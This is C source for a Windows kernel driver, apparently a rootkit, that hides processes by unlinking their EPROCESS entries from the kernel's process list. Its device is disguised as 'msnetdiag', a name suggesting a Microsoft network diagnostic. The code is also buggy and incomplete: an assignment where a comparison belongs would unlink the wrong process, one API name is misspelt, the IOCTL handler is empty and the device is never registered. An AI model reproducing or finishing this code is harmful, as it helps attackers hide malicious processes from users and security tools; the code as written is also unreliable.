#include "ntddk.h"
#include "dbgmsg.h"
#include "stdio.h"
#include "stdlib.h"

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned char BYTE;
typedef struct offset {
	BOOL isSupported;
	DWORD ProcPID;
	DWORD ProcName;
	DWORD ProcLinks;
	DWORD DriverSection;
	DWORD Token;
	DWORD nSIDS;
	DWORD PrivPresent;
	DWORD PrivEnable;
	DWORD PrivDefaultEnable;
}offset;


#define FILE_DEVICE_RK 0x00008001
#define IOCTL_TEST_HIDEME CTL_CODE(FILE_DEVICE_RK,0x801,METHOD_BUFFERED,FILE_READ_DATA|FILE_WRITE_DATA)

#define SZ_EPROCESS_NAME 0x010
#define EPROCESS_OFFSET_PID Offset.ProcPID
#define EPROCESS_OFFSET_NAME Offset.ProcName
#define EPROCESS_OFFSET_LINKS Offset.ProcLinks

const WCHAR DeviceNameBuffer[] = L"\\Device\\msnetdiag";
const WCHAR DeviceLinkBuffer[] = L"\\DosDevices\\msnetdiag";
PDRIVER_OBJECT DriverObjectRef;
PDRIVER_OBJECT MSNetDiagDeviceObject;
offset Offset;

int getPID(BYTE* currentPEP)
{
	int* pid;
	pid = (int *)(currentPEP + EPROCESS_OFFSET_PID);
	return *pid;
}

void getTaskName(char* dest, char* src)
{
	strncpy(dest, src, SZ_EPROCESS_NAME);
	dest[SZ_EPROCESS_NAME - 1] = '\0';
	return;
}

UCHAR* getPreviousPEP(BYTE* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* bLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	bLink = (BYTE*)(listEntry.Blink);
	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);
	
	return prevPEP;
}

BYTE* getNextPEP(BYTE* currentPEP)
{
	BYTE* nextPEP = NULL;
	BYTE* fLink = NULL;
	LIST_ENTRY listEntry;

	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	fLink = (BYTE*)(listEntry.Flink);
	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
	return nextPEP;
}

void modifyTaskListEntry(BYTE* currentPEP)
{
	BYTE* prevPEP = NULL;
	BYTE* nextPEP = NULL;

	int currentPID = 0;
	int prevPID = 0;
	int nextPID = 0;

	LIST_ENTRY* currentListEntry;
	LIST_ENTRY* prevListEntry;
	LIST_ENTRY* nextListEntry;

	currentPID = getPID(currentPEP);

	prevPEP = getPreviousPEP(currentPEP);
	prevPID = getPID(prevPEP);

	nextPEP = getNextPEP(currentPEP);
	nextPID = getPID(nextPEP);

	currentListEntry = ((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevPEP + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextPEP + EPROCESS_OFFSET_LINKS));

	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

}

void modifyTaskList(DWORD pid)
{
	BYTE* currentPEP = NULL;
	BYTE* nextPEP = NULL;
	int currentPID = 0;
	int startPID = 0;
	BYTE name[SZ_EPROCESS_NAME];
	int fuse = 0;
	const int BLOWN = 1048576;

	currentPEP = (UCHAR*)PsGetCurrentProcess();
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	startPID = currentPID;
	if (currentPID == pid) {
		modifyTaskListEntry(currentPEP);
		return;
	}

	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	while (startPID != currentPID) {
		if (currentPID = pid) {
			modifyTaskListEntry(currentPEP);
			return;
		}
		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
		fuse++;
		if (fuse == BLOWN)
			return;
	}
	return;
}

void HideTask(DWORD* pid)
{
	KIRQL irql;

	irql = RaiseIRQL();
	modifyTaskList(*pid);
	LowerIRQL(irql);
	return;
}

NTSTATUS RegisterDriverDeviceName
(
	IN PDRIVER_OBJECT DriverObject
)
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;

	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	ntStatus = IoCreateDevice
	(
		DriverObject,
		0,
		&unicodeString,
		FILE_DEVICE_RK,
		0,
		TRUE,
		&MSNetDiagDeviceObject
	);
	return ntStatus;
}

NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	UNICODE_STRING unicodeLinkString;
	RelInitUnicodeString(&unicodeString, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
	ntStatus = IoCreateSymbolicLink
	(
		&unicodeLinkString,
		&unicodeString
	);
	return ntStatus;
}

VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING unicodeString;
	PDEVICE_OBJECT deviceObj;
	deviceObj = (*DriverObject).DeviceObject;

	if (deviceObj != NULL) {
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);
		IoDeleteDevice((*DriverObject).DeviceObject);
	}
	return;
}

NTSTATUS defaultDispatch
(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP IRP
)
{
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	IoCompleteRequest(IRP, IO_NO_INCREMENT);

	return (STATUS_SUCCESS);
}

NTSTATUS dispatchIOControl
(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP IRP
)
{
	PIO_STACK_LOCATION irpStack;
	PVOID		inputBuffer;
	PVOID		outputBuffer;
	ULONG		inBufferLength;
	ULONG		outBufferLength;
	NTSTATUS	ntStatus;

	ntStatus = STATUS_SUCCESS;
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;

	inputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	outputBuffer = (*IRP).AssociatedIrp.SystemBuffer;

	irpStack = IoGetCurrentIrpStackLocation(IRP);
	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	DWORD ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;

	switch (ioctrlcode)
	{
	}

	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING regPath
)
{
	int i;
	NTSTATUS ntStatus;
	for (i = 0;i<IRP_MJ_MAXIMUM_FUNCTION;i++) {
		(*DriverObject).MajorFunction[i] = defaultDispatch;
	}
	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*DriverObject).DriverUnload = Unload;
	DriverObjectRef = DriverObject;
	return (STATUS_SUCCESS);
}
